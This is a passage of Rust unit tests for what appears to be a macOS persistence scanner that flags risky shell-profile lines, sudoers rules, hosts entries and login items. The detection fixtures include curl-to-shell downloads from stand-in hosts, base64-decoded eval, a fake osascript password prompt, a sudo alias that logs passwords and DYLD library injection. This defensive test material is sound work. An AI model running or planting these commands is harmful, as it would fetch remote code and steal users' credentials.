            r#"export PATH="$HOME/.cargo/bin:$HOME/.local/bin:$PATH""#,
            r#"[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh""#,
            r#"source <(kubectl completion zsh)"#,
            r#"eval "$(starship init zsh)""#,
            r#"eval "$(pyenv init -)""#,
            r#"alias sudo='sudo '"#,
            r#"alias ssh='kitty +kitten ssh'"#,
            r#"alias ssh='TERM=xterm-256color ssh'"#,
            r#"alias ll='ls -la'"#,
            r#"alias dl='cd ~/Downloads/'"#,
            r#"[[ -d /tmp/cache ]] && export CACHE=/tmp/cache"#,
            r#"[[ -n "$terminfo[kf1]" ]] && key[F1]=$terminfo[kf1]"#,
            r#"command -v fzf >/dev/null 2>&1 && source <(fzf --zsh)"#,
            r#"ls &>/dev/null"#,
            r#"[ -r "/etc/zshrc_$TERM_PROGRAM" ] && . "/etc/zshrc_$TERM_PROGRAM""#,
            r#"eval `/usr/libexec/path_helper -s`"#,
            r#"export GITHUB_TOKEN=[redacted]"#,
            r#"alias get='curl -s'"#,
            r#"if [ -f ~/.fzf.zsh ]; then source ~/.fzf.zsh; fi"#,
            r#"export BUN_INSTALL="$HOME/.bun""#,
            r#"zstyle ':completion:*' menu select"#,
        ];
        for l in benign {
            assert!(risks(l).is_empty(), "{l}: {:?}", risks(l));
        }
        let f = shell("/Users/me/.zshrc", &benign);
        assert!(shell_file(&f).is_empty());
    }

    #[test]
    fn download_and_decode() {
        for l in [
            "curl -fsSL https://evil.example/x | sh",
            "wget -qO- http://x.example/a.sh | bash",
            "bash <(curl -s https://x.example/a)",
            r#"eval "$(curl -fsSL https://x.example/p)""#,
            r#"source <(wget -qO- https://x.example/p)"#,
        ] {
            assert!(
                risks(l).contains(&(ShellRisk::Download, Severity::High)),
                "{l}"
            );
        }
        for l in [
            "echo ZWNobyBoaQ== | base64 -d | sh",
            r#"eval "$(echo ZWNobyBoaQ== | base64 --decode)""#,
            "eval $(base64 -D <<< ZWNobyBoaQ==)",
        ] {
            assert!(
                risks(l).contains(&(ShellRisk::Decode, Severity::High)),
                "{l}"
            );
        }
    }

    #[test]
    fn prompts_dyld_location_background() {
        assert!(
            risks(
                r#"osascript -e 'display dialog "Password:" default answer "" with hidden answer'"#
            )
            .contains(&(ShellRisk::Prompt, Severity::High))
        );
        assert!(
            risks("export DYLD_INSERT_LIBRARIES=/Users/me/Library/.x/libhook.dylib")
                .contains(&(ShellRisk::Dyld, Severity::High))
        );
        for l in [
            "/tmp/.updater &",
            "~/Library/.hidden/agent --quiet",
            "nohup ~/Downloads/miner >/dev/null 2>&1 &",
            "python3 /private/var/tmp/x.py",
            "$TMPDIR/helper",
        ] {
            assert!(
                risks(l).contains(&(ShellRisk::Location, Severity::High)),
                "{l}"
            );
        }
        for l in [
            "nohup /usr/local/bin/agent >/dev/null 2>&1",
            "( /usr/local/bin/sync-daemon & )",
            "/opt/thing/bin/watcher &!",
            "mytool & disown",
        ] {
            assert!(
                risks(l).contains(&(ShellRisk::Background, Severity::Medium)),
                "{l}: {:?}",
                risks(l)
            );
        }
    }

    #[test]
    fn credential_wrappers() {
        let sev = |l: &str| wrapper(l).map(|(_, s)| s);
        assert_eq!(sev("alias sudo='~/.config/.s/sudo'"), Some(Severity::High));
        assert_eq!(
            sev(r#"alias sudo='read -s -p "Password:" p; echo $p >> /tmp/.p; sudo'"#),
            Some(Severity::High)
        );
        assert_eq!(
            sev("alias ssh='/usr/local/share/sshwrap'"),
            Some(Severity::Medium)
        );
        assert_eq!(sev("alias security=mysec"), Some(Severity::Medium));
        assert_eq!(
            sev("sudo() { command sudo \"$@\"; }"),
            Some(Severity::Medium)
        );
        assert_eq!(sev("function ssh {"), Some(Severity::Medium));
        assert_eq!(sev("alias sudo='sudo '"), None);
        assert_eq!(sev("alias sudo='/usr/bin/sudo -E'"), None);
        assert_eq!(sev("alias ssh='kitty +kitten ssh'"), None);
        assert_eq!(sev("alias gs='git status'"), None);
        assert_eq!(sev("sshfs() {"), None);
        let f = shell("/Users/me/.zshrc", &["alias sudo='~/.s/sudo'"]);
        let out = shell_file(&f);
        assert_eq!(out.len(), 1);
        assert_eq!(out[0].title, "~/.zshrc replaces the `sudo` command");
        assert_eq!(out[0].source.as_deref(), Some("/Users/me/.zshrc"));
        assert!(out[0].detail.contains("line 1:"));
    }

    #[test]
    fn shell_findings_group_lines() {
        let f = shell(
            "/etc/zshrc",
            &[
                "curl -s https://a.example | sh",
                "ok",
                "curl -s https://b.example | bash",
            ],
        );
        let out = shell_file(&f);
        assert_eq!(out.len(), 1);
        assert_eq!(out[0].severity, Severity::High);
        assert_eq!(out[0].check, "persistence.shell.download");
        assert!(out[0].title.starts_with("/etc/zshrc "));
        assert!(out[0].detail.contains("line 1:") && out[0].detail.contains("line 3:"));
    }

    fn key(user: &str) -> SshKey {
        SshKey {
            user: user.into(),
            file: format!("/Users/{user}/.ssh/authorized_keys"),
            line: 1,
            key_type: "ssh-ed25519".into(),
            fingerprint: Some("SHA256:h0ATTnZh26mMnLbtlEqAGLqDgxp/sb0rY+YrMAzZB0w".into()),
            comment: Some("me@laptop".into()),
            options: Some(r#"command="/usr/bin/rsync --server",from="10.0.0.0/8""#.into()),
        }
    }

    #[test]
    fn ssh_keys_by_remote_login() {
        assert_eq!(ssh_key(&key("me"), Some(false)).severity, Severity::Info);
        assert_eq!(ssh_key(&key("me"), None).severity, Severity::Info);
        assert_eq!(ssh_key(&key("me"), Some(true)).severity, Severity::Medium);
        assert_eq!(ssh_key(&key("root"), Some(true)).severity, Severity::High);
        let f = ssh_key(&key("me"), Some(false));
        assert!(f.title.contains("h0ATTnZh"));
        assert!(f.detail.contains("can only run `/usr/bin/rsync --server`"));
        assert!(f.detail.contains("only from 10.0.0.0/8"));
        assert_eq!(f.source.as_deref(), Some("/Users/me/.ssh/authorized_keys"));
    }

    fn host(line: usize, addr: &str, names: &[&str]) -> HostsEntry {
        HostsEntry {
            file: "/etc/hosts".into(),
            line,
            address: addr.into(),
            names: names.iter().map(|s| s.to_string()).collect(),
        }
    }

    #[test]
    fn default_hosts_are_quiet() {
        let h = [
            host(10, "127.0.0.1", &["localhost"]),
            host(11, "255.255.255.255", &["broadcasthost"]),
            host(12, "::1", &["localhost"]),
        ];
        assert!(hosts(&h).is_empty());
    }

    #[test]
    fn hosts_severity() {
        let sev = |e: HostsEntry| {
            hosts(&[e])
                .into_iter()
                .map(|f| (f.severity, f.check))
                .collect::<Vec<_>>()
        };
        assert_eq!(
            sev(host(1, "10.0.0.5", &["myapp.test"])),
            [(Severity::Low, "persistence.hosts.custom".to_string())]
        );
        assert_eq!(
            sev(host(1, "185.1.2.3", &["appleid.apple.com"])),
            [(Severity::High, "persistence.hosts.redirect".to_string())]
        );
        assert_eq!(
            sev(host(1, "0.0.0.0", &["swscan.apple.com"])),
            [(Severity::High, "persistence.hosts.block".to_string())]
        );
        assert_eq!(
            sev(host(1, "127.0.0.1", &["www.virustotal.com"])),
            [(Severity::High, "persistence.hosts.block".to_string())]
        );
        // Ad and telemetry blocking under a big domain is common.
        assert_eq!(
            sev(host(1, "0.0.0.0", &["adservice.google.com"])),
            [(Severity::Low, "persistence.hosts.custom".to_string())]
        );
        // Lookalike domains aren't the real thing.
        assert_eq!(
            sev(host(1, "1.2.3.4", &["notapple.com"])),
            [(Severity::Low, "persistence.hosts.custom".to_string())]
        );
    }

    fn sudo(text: &str) -> Option<(Severity, String)> {
        sudoers_line(&SudoersLine {
            file: "/etc/sudoers".into(),
            line: 1,
            text: text.into(),
        })
        .map(|f| (f.severity, f.check))
    }

    #[test]
    fn sudoers_defaults_are_quiet() {
        for l in [
            "Defaults env_reset",
            "Defaults env_keep += \"BLOCKSIZE\"",
            "Defaults lecture_file = \"/etc/sudo_lecture\"",
            "root ALL = (ALL) ALL",
            "%admin ALL = (ALL) ALL",
            "Cmnd_Alias VPN = /usr/local/bin/vpn",
        ] {
            assert_eq!(sudo(l), None, "{l}");
        }
    }

    #[test]
    fn sudoers_rules() {
        assert_eq!(
            sudo("bob ALL=(ALL) NOPASSWD: ALL").map(|s| s.0),
            Some(Severity::High)
        );
        assert_eq!(
            sudo("%admin ALL = (ALL) NOPASSWD: ALL").map(|s| s.0),
            Some(Severity::High)
        );
        assert_eq!(
            sudo("me ALL=(root) NOPASSWD: /usr/local/bin/vpnc").map(|s| s.0),
            Some(Severity::Medium)
        );
        assert_eq!(
            sudo("Defaults !authenticate"),
            Some((
                Severity::High,
                "persistence.sudoers.no_authentication".into()
            ))
        );
        assert_eq!(
            sudo("Defaults timestamp_timeout=-1").map(|s| s.0),
            Some(Severity::Medium)
        );
        assert_eq!(
            sudo("eve ALL=(ALL) ALL").map(|s| s.0),
            Some(Severity::Medium)
        );
        assert_eq!(
            sudo("%wheel ALL=(ALL) ALL").map(|s| s.0),
            Some(Severity::Low)
        );
    }

    fn profile(name: &str, org: Option<&str>, payloads: &[&str]) -> ConfigProfile {
        ConfigProfile {
            scope: "computer".into(),
            identifier: format!("com.example.{name}"),
            name: name.into(),
            organization: org.map(str::to_string),
            payload_types: payloads.iter().map(|s| s.to_string()).collect(),
            removal_disallowed: false,
        }
    }

    #[test]
    fn profile_severity() {
        let sev = |list: &[ConfigProfile]| {
            profiles(list)
                .iter()
                .map(|f| f.severity)
                .collect::<Vec<_>>()
        };
        assert_eq!(
            sev(&[profile("cert", None, &["com.apple.security.root"])]),
            [Severity::High]
        );
        assert_eq!(
            sev(&[profile("proxy", None, &["com.apple.proxy.http.global"])]),
            [Severity::High]
        );
        assert_eq!(
            sev(&[profile("wifi", None, &["com.apple.wifi.managed"])]),
            [Severity::Medium]
        );
        // A company MDM and its profiles: normal for a work Mac.
        let work = [
            profile("mdm", Some("Acme"), &["com.apple.mdm"]),
            profile("ca", Some("Acme"), &["com.apple.security.root"]),
            profile("other", Some("Evil"), &["com.apple.security.root"]),
        ];
        assert_eq!(sev(&work), [Severity::Info, Severity::Info, Severity::High]);
        let f = &profiles(&work)[1];
        assert!(f.detail.contains("organisation"));
        assert!(f.detail.contains("trusted root certificate"));
    }

    #[test]
    fn login_hooks() {
        let hook = |cmd: &str, exists: bool, kind| LoginHook {
            kind: "LoginHook".into(),
            plist: "/var/root/Library/Preferences/com.apple.loginwindow.plist".into(),
            command: cmd.into(),
            exists,
            signing: exists.then_some(Signing {
                kind,
                identifier: None,
                team_id: None,
                notarized: false,
            }),
        };
        assert_eq!(
            login_hook(&hook("/Library/.x/hook.sh", true, SignatureKind::Unsigned)).severity,
            Severity::High
        );
        assert_eq!(
            login_hook(&hook("/gone/hook.sh", false, SignatureKind::Unsigned)).severity,
            Severity::Low
        );
        assert_eq!(
            login_hook(&hook("/usr/bin/true", true, SignatureKind::Apple)).severity,
            Severity::Low
        );
    }

    #[test]
    fn extensions() {
        let ext = |team: Option<&str>, active| SystemExtension {
            category: "com.apple.system_extension.network_extension".into(),
            team_id: team.map(str::to_string),
            bundle_id: "com.objective-see.lulu.extension".into(),
            version: Some("2.6".into()),
            name: "LuLu".into(),
            state: if active {
                "activated enabled".into()
            } else {
                "terminated waiting to uninstall on reboot".into()
            },
            enabled: active,
            active,
        };
        assert_eq!(
            system_extension(&ext(Some("VR3CR5QXV9"), true)).map(|f| f.severity),
            Some(Severity::Info)
        );
        assert_eq!(
            system_extension(&ext(None, true)).map(|f| f.severity),
            Some(Severity::Medium)
        );
        assert!(system_extension(&ext(Some("X"), false)).is_none());

        let mut snap = Snapshot::default();
        snap.takeover.kernel_extensions.push(KernelExtension {
            bundle_id: "com.vmware.kext.vmx86".into(),
            version: None,
        });
        let f = assess(&snap);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Low);
    }

    #[test]
    fn background_items() {
        let signing = |kind, notarized| Signing {
            kind,
            identifier: None,
            team_id: Some("TEAM".into()),
            notarized,
        };
        let item = |kind: &str, exe: &str, s: Option<Signing>| BackgroundItem {
            uid: Some(501),
            name: "Helper".into(),
            kind: kind.into(),
            executable: Some(exe.into()),
            enabled: true,
            signing: s,
            ..Default::default()
        };
        let sev = |b: BackgroundItem| background_item(&b).map(|f| f.severity);
        assert_eq!(
            sev(item(
                "agent",
                "/Applications/A.app/Contents/MacOS/h",
                Some(signing(SignatureKind::ThirdParty, true))
            )),
            Some(Severity::Info)
        );
        assert_eq!(
            sev(item(
                "agent",
                "/Applications/A.app/Contents/MacOS/h",
                Some(signing(SignatureKind::Unsigned, false))
            )),
            Some(Severity::Medium)
        );
        assert_eq!(
            sev(item(
                "login item",
                "/Users/me/Library/.x/h",
                Some(signing(SignatureKind::ThirdParty, true))
            )),
            Some(Severity::High)
        );
        // Covered by the launchd checks.
        assert_eq!(
            sev(item(
                "legacy daemon",
                "/Library/PrivilegedHelperTools/x",
                Some(signing(SignatureKind::Unsigned, false))
            )),
            None
        );
        assert_eq!(
            sev(item(
                "agent",
                "/System/x",
                Some(signing(SignatureKind::Apple, false))
            )),
            None
        );
        let mut disabled = item("agent", "/tmp/x", None);
        disabled.enabled = false;
        assert_eq!(sev(disabled), None);
    }

    #[test]
    fn same_key_findings_merge() {
        let mut snap = Snapshot::default();
        for (i, t) in [
            "bob ALL=(ALL) NOPASSWD: /bin/a",
            "bob ALL=(ALL) NOPASSWD: /bin/b",
        ]
        .iter()
        .enumerate()
        {
            snap.takeover.sudoers.push(SudoersLine {
                file: "/etc/sudoers.d/bob".into(),
                line: i + 1,
                text: t.to_string(),
            });
        }
        let f = assess(&snap);
        assert_eq!(f.len(), 1);
        assert!(f[0].detail.contains("/bin/a") && f[0].detail.contains("/bin/b"));
    }
}
